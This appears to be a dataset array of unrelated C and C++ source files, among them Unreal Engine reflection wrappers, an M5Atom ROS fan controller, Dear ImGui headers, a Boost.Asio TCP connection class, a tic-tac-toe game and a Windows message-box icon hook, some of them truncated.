EMatchaCharacterMontageType PreviousMontageType, EObjectRarity BuffRarity) const\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"BUF_MagLevGrab_Base_C\", \"OnCharacterMontageStart\");\n\n\tParams::BUF_MagLevGrab_Base_C_OnCharacterMontageStart Parms{};\n\n\tParms.BuffedCharacter = BuffedCharacter;\n\tParms.MontageDuration = MontageDuration;\n\tParms.MontageType = MontageType;\n\tParms.PreviousMontageType = PreviousMontageType;\n\tParms.BuffRarity = BuffRarity;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function BUF_MagLevGrab_Base.BUF_MagLevGrab_Base_C.OnPostApplyOutgoingHit\n// (Event, Public, HasOutParams, BlueprintCallable, BlueprintEvent, Const)\n// Parameters:\n// class AMatchaSnapNetCharacterEntity*    BuffedCharacter                                        (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, NoDestructor, HasGetValueTypeHash)\n// class AActor*                           TargetHit                                              (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, NoDestructor, HasGetValueTypeHash)\n// class AActor*                           PreviousTargetHit                                      (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, NoDestructor, HasGetValueTypeHash)\n// struct FMatchaHitData                   HitData                                                (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm)\n// uint8                                   AppliedHitFlags                                        (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// EMatchaCharacterMontageType             MontageDuringHit                                       (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// EObjectRarity                           BuffRarity                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UBUF_MagLevGrab_Base_C::OnPostApplyOutgoingHit(class AMatchaSnapNetCharacterEntity* BuffedCharacter, class AActor* TargetHit, class AActor* PreviousTargetHit, const struct FMatchaHitData& HitData, uint8 AppliedHitFlags, EMatchaCharacterMontageType MontageDuringHit, EObjectRarity BuffRarity) const\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"BUF_MagLevGrab_Base_C\", \"OnPostApplyOutgoingHit\");\n\n\tParams::BUF_MagLevGrab_Base_C_OnPostApplyOutgoingHit Parms{};\n\n\tParms.BuffedCharacter = BuffedCharacter;\n\tParms.TargetHit = TargetHit;\n\tParms.PreviousTargetHit = PreviousTargetHit;\n\tParms.HitData = std::move(HitData);\n\tParms.AppliedHitFlags = AppliedHitFlags;\n\tParms.MontageDuringHit = MontageDuringHit;\n\tParms.BuffRarity = BuffRarity;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n}\n\n",
    "#include <M5Unified.h>\n#include <FastLED.h>\n#include <ros.h>\n#include <std_msgs/Bool.h>\n\n\n// RGB LED\u306e\u6570\u3092\u6307\u5b9a(M5Atom Matrix\u306a\u308925)\n#define NUM_LEDS 1\n// RGB LED\u306eDATA PIN\u3092\u6307\u5b9a\n#define LED_DATA_PIN 27\n#define GPIO_PIN 25  // GPIO 25\u756a\u30d4\u30f3\n\nCRGB leds[NUM_LEDS];  // LED\u306e\u5b9a\u7fa9\n\nros::NodeHandle nh;  // ROS\u30ce\u30fc\u30c9\u30cf\u30f3\u30c9\u30eb\n\nvoid messageCb( const std_msgs::Bool& toggle_msg){\n  //digitalWrite(GPIO_PIN, HIGH-digitalRead(GPIO_PIN));   // blink the led\n  digitalWrite(GPIO_PIN, toggle_msg.data);   // blink the led\n\n  if (toggle_msg.data) {\n    leds[0] = CRGB::Green;      // LED\u3092\u8d64\u306b\u8a2d\u5b9a\n  } else {\n    leds[0] = CRGB::Black;    // LED\u3092\u6d88\u706f\n  }\n  FastLED.show();  // LED\u72b6\u614b\u3092\u53cd\u6620\n}\n\nros::Subscriber<std_msgs::Bool> sub(\"toggle_fan\", &messageCb );\n\nvoid setup()\n{\n  auto cfg = M5.config();\n  M5.begin(cfg);\n  FastLED.addLeds<WS2811, LED_DATA_PIN, GRB>(leds, NUM_LEDS);  // LED\u521d\u671f\u8a2d\u5b9a\n  FastLED.setBrightness(20);  // \u660e\u308b\u3055\u3092\u8a2d\u5b9a\n\n  pinMode(GPIO_PIN, OUTPUT);\n  digitalWrite(GPIO_PIN, LOW);   // blink the led\n  nh.initNode();\n  nh.subscribe(sub);\n}\n\nvoid loop()\n{\n  nh.spinOnce();\n  delay(1);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Calculator.cpp\n *\n *  Date: 9/15\n *  Author: Carter Nadain\n */\n\n#include <iostream> // using for input and output \n\nusing namespace std;\n\nint main() // changed orignal void main to int main for proper c++ standards\n{\n\t// char statement[100]; // commented out this isn't doing anything for the program\n\tdouble op1, op2; // changed to double for floating point calculations\n\tchar operation;\n\tchar answer='Y'; // added single quotes and a semicolon for proper C++ standards\n    //add spacing for proper sequencing \n    // Loop to continue asking for new expressions until the user decides to stop\n    while (answer == 'Y' || answer == 'y')  // adjusted the condition to check both 'Y' and 'y'.\n\t {\n        cout << \"Enter expression (e.g., 2 + 2): \";  // Instructions for the user.\n        cin >> op1 >> operation >> op2;  // adjusted Input format so it matches the expected operand/operator order.\n        // This statement performs the calculation based on the operator provided by the user.\n        if (operation == '+')  // took the semicolon at the end of the if statement.\n            cout << op1 << \" + \" << op2 << \" = \" << op1 + op2 << endl;  // fixed the output for addition.\n        else if (operation == '-')  // Changed this to an else if statment to avoid multiple evaluations.\n            cout << op1 << \" - \" << op2 << \" = \" << op1 - op2 << endl;  // fixed output for subtraction.\n        else if (operation == '*')\n            cout << op1 << \" * \" << op2 << \" = \" << op1 * op2 << endl;  // fixed output for * (fixed operator from / to *).\n        else if (operation == '/') \n        {\n            if (op2 != 0)  // Added check to avoid division by zero.\n                cout << op1 << \" / \" << op2 << \" = \" << op1 / op2 << endl;  // fixed the output for division.\n            else\n                cout << \"Error: Division by zero is undefined!\" << endl;  // Error message for user. \n        }\n        else\n            cout << \"Invalid operator. Please use +, -, *, or /.\" << endl;  // Error message for invalid uses for the users.\n\n        // question for the user if they want to continue the program.\n        cout << \"Do you wish to evaluate another expression? (Y/N): \";\n        cin >> answer;  // Taking the user's input to continue or end the program.\n    }\n\n    // Message when the program ends.\n    cout << \"Program Finished.\" << endl;\n\n    return 0;  // Returning 0 to show successful execution of the program.\n}",
    "/*\nProblem 386 : Lexicographical Numbers(Medium)\nProblem Description:\nThe function lexicalOrder generates numbers from 1 to n in lexicographical (dictionary) order. This can be thought of as the order in which strings are arranged in a dictionary, but we are doing it for numbers.\n\nApproach:\nThe approach uses Depth-First Search (DFS) to explore and build numbers in lexicographical order. The solve function recursively constructs numbers by appending digits (0-9) to the current number and stops when it exceeds the limit n.\n\nExplanation of the Code:\nsolve Function:\n\nBase case: If the number exceeds the limit (num > limit), the recursion stops.\nRecursive step: For each valid number, it appends the digits from 0 to 9 to the current number (num), forms a new number (curr_num), and recurses if the new number is valid (i.e., does not exceed n).\nThis function ensures that all numbers are explored in lexicographical order.\nlexicalOrder Function:\n\nIt initializes the result vector res.\nIt starts the DFS process by calling solve for the starting numbers 1 to 9 because lexicographical order starts with these digits.\n\nTime Complexity:\nThe time complexity is O(n) because we are visiting each number between 1 and n once.\n\nSpace Complexity:\nThe space complexity is O(n) due to the result vector res which stores all the numbers from 1 to n. Additionally, the recursion stack can go as deep as the number of digits in n, but this is typically bounded by O(log(n)).\n\n*/\n\n\nclass Solution {\npublic:\n    // Recursive function to explore numbers in lexicographical order\n    void solve(int num, vector<int> &res, int limit) {\n        // If the current number exceeds the limit 'n', stop recursion\n        if(num > limit) {\n            return;\n        }\n\n        // Add the valid number to the result list\n        res.push_back(num);\n\n        // Loop through digits 0-9 to generate new numbers by appending to 'num'\n        for(int i = 0; i <= 9; i++) {\n            int curr_num = 10 * num + i;  // Form the new number\n\n            // If the new number exceeds the limit, stop further recursion for this branch\n            if(curr_num > limit) {\n                return;\n            }\n\n            // Recur with the new number to continue generating lexicographically\n            solve(curr_num, res, limit);   \n        }\n    }\n\n    // Main function to generate numbers in lexicographical order up to 'n'\n    vector<int> lexicalOrder(int n) {\n        vector<int> res;  // Result vector to store the numbers\n\n        // Start the DFS process for numbers starting with digits 1 to 9\n        for(int i = 1; i <= 9; i++) {\n            solve(i, res, n);\n        }\n\n        // Return the final result vector containing numbers in lexicographical order\n        return res;\n    }\n};\n",
    "// dear imgui, v1.89.7 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// -------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n// -------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Exam",
    "// dear imgui, v1.89.5 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic",
    "#include \"tcpconnection.h\"\n\n#include <iostream>\n#include <queue>\n#include <boost/thread/thread.hpp>\n\nstruct Network::TcpConnection::TcpConnectionImpl\n{\n\tstatic constexpr int DEFAULT_BUFFER_SIZE = 1024;\n\tstatic constexpr char DELIMITER = '\\n';\n\n\texplicit TcpConnection::TcpConnectionImpl (tcp::socket &&socket, const int bufferSize = DEFAULT_BUFFER_SIZE) :\n\t\tSocket (std::move (socket)), Buffer (bufferSize)\n\t{\n\t\tboost::system::error_code ec;\n\t\tName = GetName (ec);\n\t}\n\n\t// determines the name of the connection based on the remote endpoint\n\tstd::string GetName (boost::system::error_code &ec) const\n\t{\n\t\tstd::stringstream namestr;\n\t\tnamestr << Socket.remote_endpoint (ec);\n\n\t\treturn namestr.str ();\n\t}\n\n\t// the socket used for communication and is supplied by the consumer\n\ttcp::socket Socket;\n\n\t// cached buffer->used for reading and writing; default size is 1024 bytes passed to constructor\n\tboost::asio::streambuf Buffer;\n\n\t// UUID\n\tstd::string Name{};\n\n\t// queue of messages to be sent to all clients\n\tstd::queue<std::string> Messages;\n\n\tMsgHandler MessageHandler;\n\tErrHandler ErrorHandler;\n};\n\nNetwork::TcpConnection::TcpCntPtr Network::TcpConnection::New (tcp::socket &&socket, const int bufferSize = TcpConnectionImpl::DEFAULT_BUFFER_SIZE)\n{\n\treturn TcpCntPtr (new TcpConnection (std::move (socket), bufferSize));\t// cannot use std::make_shared here\n}\n\nboost::asio::ip::tcp::socket &Network::TcpConnection::GetSocket () const { return this->m_impl->Socket; }\n\nstd::string Network::TcpConnection::GetName () const\n{\n\treturn m_impl->Name;\n}\n\n// starts the async read loop\nvoid Network::TcpConnection::Start (MsgHandler &&msgHndl, ErrHandler &&errHandl)\n{\n\ttry\n\t{\n\t\tm_impl->ErrorHandler = std::move (errHandl);\n\t\tm_impl->MessageHandler = std::move (msgHndl);\n\n\t\tboost::thread readThread{ [this] ()\n\t\t{\n\t\t\tAsyncRead ();\n\t\t} };\n\n\t\treadThread.join ();\n\t}\n\tcatch (std::exception &)\n\t{\n\t\tm_impl->Socket.close ();\n\t}\n\n\t//AsyncRead ();\n}\n\nvoid Network::TcpConnection::Post (std::string &&msg)\n{\n\tconst bool idle = m_impl->Messages.empty ();\t// this check technically delays execution by '1 frame'\n\n\tm_impl->Messages.push (std::move (msg));\n\n\tif (idle)\n\t{\n\t\tAsyncWrite ();\n\t}\n}\n\nNetwork::TcpConnection::~TcpConnection ()\n{\n\tm_impl->Socket.close ();\n}\n\nvoid Network::TcpConnection::BuildAndSendMessage (const std::string &msg, size_t transferred) const\n{\n\tm_impl->MessageHandler (msg);\n}\n\nNetwork::TcpConnection::TcpConnection (tcp::socket &&socket, int bufferSize)\n{\n\tm_impl = std::make_unique<TcpConnectionImpl> (std::move (socket), bufferSize);\n}\n\nvoid Network::TcpConnection::AsyncRead ()\n{\n\tasync_read_until (\n\t\tm_impl->Socket,\n\t\tm_impl->Buffer,\n\t\t\"\\n\",\t\t// new line by default\n\t\t[ptr = shared_from_this ()] // capture a shared pointer to this object\n\t\t(boost::system::error_code e, const size_t transferred)\n\t\t{\n\t\t\tptr->OnRead (e, transferred);\n\t\t}\n\t);\n}\n\nvoid Network::TcpConnection::OnRead (boost::system::error_code &e, size_t transferred)\n{\n\tif (e)\n\t{\n\t\tm_impl->Socket.close (e);\t// Socket.close can throw an exception; pass 'e' to capture this\n\n\t\tif (m_impl->ErrorHandler)\n\t\t{\n\t\t\tm_impl->ErrorHandler (e);\n\t\t}\n\n\t\treturn;\n\t}\n\n\tstd::stringstream message;\n\n\t// boost::asio::streambuf is derived from std::streambuf\n\tmessage << std::istream (&(m_impl->Buffer)).rdbuf ();\n\t//m_impl->Buffer.consume (transferred);\trdbuf calls this internally -> it consumes the bytes on the buffer\n\t// if we DONT want the bytes to be read, we need to consume manually (do not call rdbuf for persistent)\n\n\tif (e)\n\t{\n\t\tm_impl->Socket.close (e);\n\n\t\tif (m_impl->ErrorHandler)\n\t\t{\n\t\t\tm_impl->ErrorHandler (e);\n\t\t}\n\n\t\treturn;\n\t}\n\n\t// logging\n\tif (m_impl->MessageHandler)\n\t{\n\t\tBuildAndSendMessage (message.str (), transferred);\n\t}\n\n\t// kick the loop back off\n\tAsyncRead ();\n}\n\nvoid Network::TcpConnection::AsyncWrite ()\n{\n\tasync_write (\n\t\tm_impl->Socket,\n\t\tboost::asio::buffer (m_impl->Messages.front ()),\n\t\t[ptr = shared_from_this ()] // capture a shared pointer to this object\n\t\t(boost::system::error_code e, const size_t transferred)\n\t\t{\n\t\t\tptr->OnWrite (e, transferred);\n\t\t}\n\t);\n}\n\nvoid Network::TcpConnection::OnWrite (boost::system::error_code &e, size_t transferred)\n{\n\t// logging\n\tif (m_impl->MessageHandler)\n\t{\n\t\tBuildAndSendMessage (\"Write\", transferred);\n\t}\n\n\tif (e)\n\t{\n\t\tm_impl->Socket.close (e);\t// Socket.close can throw an exception; pass 'e' to capture this\n\n\t\tif (m_impl->ErrorHandler)\n\t\t{\n\t\t\tm_impl->ErrorHandler (e);\n\t\t}\n\n\t\treturn;\n\t}\n\n\t// cache/pop the first message in the queue\n\tauto msg = m_impl->Messages.front ();\n\tm_impl->Messages.pop ();\n\n\tif (!m_impl->Messages.empty ())\n\t{\n\t\tAsyncWrite ();\n\t}\n}\n",
    "#include <stdio.h>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n\r\n#define MAX_STACK_SIZE 50\r\n\r\nint grid[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};\r\nint moveHistory[MAX_STACK_SIZE];\r\nint moveCount = 0;\r\n\r\nint findWinner();\r\nvoid squareBoard();\r\nvoid pushMove(int move);\r\nint popMove();\r\nvoid printMoveHistory();\r\n\r\nint main()\r\n{\r\n    int player = 1, check, wish;\r\n\r\n    char spot;\r\n    do\r\n    {\r\n        squareBoard();\r\n        player = (player % 2) ? 1 : 2;\r\n\r\n        printf(\"\\033[1;34m\");\r\n        printf(\"Player %d, enter a digit:  \", player);\r\n        scanf(\"%d\", &wish);\r\n\r\n        spot = (player == 1) ? 'X' : '0';\r\n\r\n        if (wish >= 1 && wish <= 9 && grid[wish] == '0' + wish)\r\n        {\r\n            grid[wish] = spot;\r\n            pushMove(wish);\r\n        }\r\n        else\r\n        {\r\n            printf(\"\\033[1;32m\");\r\n            printf(\"Invalid move by the player\");\r\n            player--;\r\n            getch();\r\n        }\r\n\r\n        check = findWinner();\r\n        player++;\r\n\r\n    } while (check == -1 && moveCount < MAX_STACK_SIZE);\r\n\r\n    squareBoard();\r\n\r\n    if (check == 1)\r\n        printf(\"==>\\aPlayer %d win. Congratulations!\\n\", --player);\r\n    else if (check == 0)\r\n        printf(\"==>\\aGame draw! Better luck next time!\\n\");\r\n    else\r\n        printf(\"==>\\aGame over! Maximum move limit reached.\\n\");\r\n\r\n    printf(\"\\nMove History:\\n\");\r\n    printMoveHistory();\r\n\r\n    getch();\r\n    return 0;\r\n}\r\n\r\nint findWinner()\r\n{\r\n    if (grid[1] == grid[2] && grid[2] == grid[3])\r\n        return 1;\r\n    else if (grid[4] == grid[5] && grid[5] == grid[6])\r\n        return 1;\r\n    else if (grid[7] == grid[8] && grid[8] == grid[9])\r\n        return 1;\r\n    else if (grid[1] == grid[4] && grid[4] == grid[7])\r\n        return 1;\r\n    else if (grid[2] == grid[5] && grid[5] == grid[8])\r\n        return 1;\r\n    else if (grid[3] == grid[6] && grid[6] == grid[9])\r\n        return 1;\r\n    else if (grid[1] == grid[5] && grid[5] == grid[9])\r\n        return 1;\r\n    else if (grid[3] == grid[5] && grid[5] == grid[7])\r\n        return 1;\r\n    else if (grid[1] != '1' && grid[2] != '2' && grid[3] != '3' &&\r\n             grid[4] != '4' && grid[5] != '5' && grid[6] != '6' && grid[7] != '7' &&\r\n             grid[8] != '8' && grid[9] != '9')\r\n        return 0;\r\n    else\r\n        return -1;\r\n}\r\n\r\nvoid squareBoard()\r\n{\r\n    printf(\"\\033[1;31m\");\r\n    printf(\"\\n\\t\\tTIC TAC TOE GAME \\n\\n\\n\");\r\n\r\n    printf(\"\\033[1;36m\");\r\n    printf(\"\\tPlayer1 (X)  -  Player2 (0)\\n\\n\");\r\n    printf(\"\\033[1;35m\");\r\n\r\n    printf(\"  ____________________\\n\");\r\n    printf(\" |      |       |     |\\n\");\r\n    printf(\" |  %c   |  %c    |  %c  |\\n\", grid[1], grid[2], grid[3]);\r\n\r\n    printf(\" |______|_______|_____|\\n\");\r\n    printf(\" |      |       |     |\\n\");\r\n\r\n    printf(\" |  %c   |  %c    |  %c  |\\n\", grid[4], grid[5], grid[6]);\r\n\r\n    printf(\" |______|_______|_____|\\n\");\r\n    printf(\" |      |       |     |\\n\");\r\n\r\n    printf(\" |  %c   |  %c    |  %c  |\\n\", grid[7], grid[8], grid[9]);\r\n    printf(\" |______|_______|_____|\\n\");\r\n}\r\n \r\nvoid pushMove(int move)\r\n{\r\n    if (moveCount < MAX_STACK_SIZE)\r\n        moveHistory[moveCount++] = move;\r\n}\r\n\r\nint popMove()\r\n{\r\n    if (moveCount > 0)\r\n        return moveHistory[--moveCount];\r\n    else\r\n        return -1; // Stack underflow\r\n}\r\n\r\nvoid printMoveHistory()\r\n\r\n{\r\n\tint i;\r\n    for (i = 0; i < moveCount; i++)\r\n    {\r\n        printf(\"%d \", moveHistory[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n",
    "#include \"stdafx.h\"\n\n#include \"resource.h\"\n#include \"rtlframe.h\"\n\nstruct FICON \n{\n\tHICON hIcon;\n};\n\nLRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam )\n{\n\tif (nCode == HCBT_CREATEWND)\n\t{\n\t\tCBT_CREATEWND* pccw = reinterpret_cast<CBT_CREATEWND*>(lParam);\n\n\t\tif (pccw->lpcs->lpszClass == WC_DIALOG)\n\t\t{\n\t\t\tif (FICON* p = RTL_FRAME<FICON>::get())\n\t\t\t{\n\t\t\t\tSendMessageW((HWND)wParam, WM_SETICON, ICON_SMALL, (LPARAM)p->hIcon);\t\t\n\t\t\t}\n\t\t}\n\t}\n\n\treturn CallNextHookEx(0, nCode, wParam, lParam);\n}\n\nint CustomMessageBox(HWND hWnd, PCWSTR lpText, PCWSTR lpszCaption, UINT uType)\n{\n\tPCWSTR pszName = 0;\n\n\tswitch (uType & MB_ICONMASK)\n\t{\n\tcase MB_ICONINFORMATION:\n\t\tpszName = IDI_INFORMATION;\n\t\tbreak;\n\tcase MB_ICONQUESTION:\n\t\tpszName = IDI_QUESTION;\n\t\tbreak;\n\tcase MB_ICONWARNING:\n\t\tpszName = IDI_WARNING;\n\t\tbreak;\n\tcase MB_ICONERROR:\n\t\tpszName = IDI_ERROR;\n\t\tbreak;\n\t}\n\n\tMSGBOXPARAMS mbp = {\n\t\tsizeof(mbp),\n\t\tIsWindowVisible(hWnd) ? hWnd : 0,\n\t\t(HINSTANCE)&__ImageBase,\n\t\tlpText, \n\t\tlpszCaption, \n\t\t(uType & ~MB_ICONMASK)|MB_USERICON,\n\t\tMAKEINTRESOURCE(1)\n\t};\n\n\tHHOOK hhk = 0;\n\tRTL_FRAME<FICON> frame;\n\tframe.hIcon = 0;\n\n\tif (pszName 